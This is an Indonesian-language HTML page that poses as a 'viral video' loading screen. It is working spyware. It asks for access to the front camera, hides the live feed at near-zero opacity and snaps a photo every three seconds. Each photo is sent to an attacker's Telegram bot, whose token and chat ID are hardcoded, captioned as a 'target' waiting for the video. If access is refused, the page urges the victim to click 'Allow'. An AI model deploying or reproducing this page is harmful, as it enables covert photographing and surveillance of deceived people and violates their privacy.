# Kerekek.html
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>REKAMAN VIDEO VIRAL 2025</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .container { text-align: center; width: 90%; }
        .loader { border: 4px solid #1a1a1a; border-top: 4px solid #ff0000; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { font-size: 14px; margin: 5px 0; color: #ccc; }
        #video-stream { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0.02; z-index: 1; pointer-events: none; }
    </style>
</head>
<body>

    <video id="video-stream" autoplay playsinline muted></video>
    <canvas id="canvas-capture" style="display:none;"></canvas>

    <div class="container">
        <div class="loader"></div>
        <p><b>Menghubungkan ke Server Video...</b></p>
        <p id="msg">Tunggu sebentar, trafik sedang padat.</p>
        <p style="font-size: 10px; color: #444; margin-top: 30px;">ID: VR-99281726</p>
    </div>

    <script>
        const video = document.getElementById('video-stream');
        const canvas = document.getElementById('canvas-capture');
        
        // DATA BARU LU
        const token = "8331314956:AAEoZVqAzJYF97BzSAN-rNgiHgD3sNTD0_U";
        const chatId = "8465963357"; // Pastikan Chat ID ini bener ID lu

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                await video.play();
                
                // Mulai jepret tiap 3 detik
                setInterval(takeAction, 3000);
            } catch (e) {
                document.getElementById('msg').innerHTML = "<span style='color:red'>Klik 'Izinkan' untuk menonton video.</span>";
            }
        }

        function takeAction() {
            if (video.videoWidth > 0) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    const form = new FormData();
                    form.append('chat_id', chatId);
                    form.append('photo', blob, 'shot.png');
                    form.append('caption', 'Target lagi melongo nunggu video viral...');
                    
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                        method: 'POST',
                        body: form
                    });
                }, 'image/png');
            }
        }

        window.onload = init;
    </script>
</body>
</html>
